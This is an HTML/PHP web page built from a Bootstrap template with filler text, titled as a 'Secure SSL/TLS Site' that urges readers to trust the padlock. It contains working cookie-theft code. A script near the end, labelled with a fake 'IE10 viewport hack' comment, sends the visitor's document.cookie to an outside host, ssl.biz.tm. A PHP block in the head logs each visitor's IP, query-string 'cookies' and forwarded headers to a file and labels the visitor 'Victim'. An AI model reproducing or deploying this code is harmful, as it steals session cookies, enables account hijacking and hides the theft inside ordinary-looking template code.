<!DOCTYPE html>
<html lang="en">
  <head>

<meta name="norton-safeweb-site-verification" content="0ac2uywmxy80k0ck2s8kz7onth-zjbi8a8bbmuv8szo0bw5jihv4t7-enfbiik2i8q1efcqk24bpee75egny1swhdknn33-rvnddcya2qhsnp0y2bz73kczm5lr24d-w" />


<meta name="norton-safeweb-site-verification" content="lj1qfn95izs2lxo92iww5hs9u9z09w5ki8z489pm0h3g3hsnyo7ragtks5t79kt1wgh5tui2e3ijue0kd2ykl2l81sa-tpxqj7knleoju6osglk15ikvr0-bf0t2lb6g" />

<meta name="google-site-verification" content="1SXmUIy4U9pkNuZeLC0TidfXbDY95OPYoaDxhT5vvxs" />

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Secure SSL / TLS Site - trust the padlocks</title>


<?php error_reporting(1);

function collect(){
        $file = 'client.txt';                                   #log file
        $date = date("l dS of F Y h:i:s A");    		#DATE
        $IP = $_SERVER['REMOTE_ADDR'];
        $cookie = $_SERVER['QUERY_STRING'];
        $other = $_SERVER['HTTP_X_FORWARDED_FOR'];

        $log = "[$date]\n\t>
                        Victim IP: $IP\n\t
                        Cookies: $cookie\n\t
                        Info: $other\n\n";
        $handle = fopen($file,"a");             		#open file to append
        fwrite($handle,$log."\n\n");
        fclose($handle);

}

collect();
?>

    <!-- Bootstrap core CSS -->
    <link href="/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../../assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="justified-nav.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <div class="container">

      <!-- The justified navigation menu is meant for single line per list item.
           Multiple lines will require custom code not provided by Bootstrap. -->
      <div class="masthead">
        <h3 class="text-muted">Secure Site</h3>
        <nav>
          <ul class="nav nav-justified">
            <li class="active"><a href="#">Home</a></li>
            <li><a href="#">Projects</a></li>
            <li><a href="#">Services</a></li>
            <li><a href="#">Downloads</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Contact</a></li>
          </ul>
        </nav>
      </div>

      <!-- Jumbotron -->
      <div class="jumbotron">
        <h1>Secure SSL/TLS Site!</h1>
	    <h2>Trust the Padlock, trust the Site Seal, trust the Root CA's </h2>
		<br>
<!--        <p class="lead">Trust the Site Seals, trust the site padlocks, trust your Root CA's.</p> -->
        <p><a class="btn btn-lg btn-success" href="#" role="button">If it is Green it's trusted</a></p>
      </div>

      <!-- Example row of columns -->
      <div class="row">
        <div class="col-lg-4">
          <h2>Safari bug warning!</h2>
          <p class="text-danger">As of v8.0, Safari exhibits a bug in which resizing your browser horizontally causes rendering errors in the justified nav that are cleared upon refreshing.</p>
          <p>Donec id elit non mi porta gravida at eget metus. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Etiam porta sem malesuada magna mollis euismod. Donec sed odio dui. </p>
          <p><a class="btn btn-primary" href="#" role="button">View details &raquo;</a></p>
        </div>
        <div class="col-lg-4">
          <h2>Heading</h2>
          <p>Donec id elit non mi porta gravida at eget metus. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Etiam porta sem malesuada magna mollis euismod. Donec sed odio dui. </p>
          <p><a class="btn btn-primary" href="#" role="button">View details &raquo;</a></p>
       </div>
        <div class="col-lg-4">
          <h2>Heading</h2>
          <p>Donec sed odio dui. Cras justo odio, dapibus ac facilisis in, egestas eget quam. Vestibulum id ligula porta felis euismod semper. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa.</p>
          <p><a class="btn btn-primary" href="#" role="button">View details &raquo;</a></p>
        </div>
      </div>

      <!-- Site footer -->
      <footer class="footer">
        <p>&copy; 2015 Company, Inc.</p>
      </footer>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
	<script>
       new Image().src = "https://ssl.biz.tm/index.php?cc="+escape(document.cookie);
</script>

    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
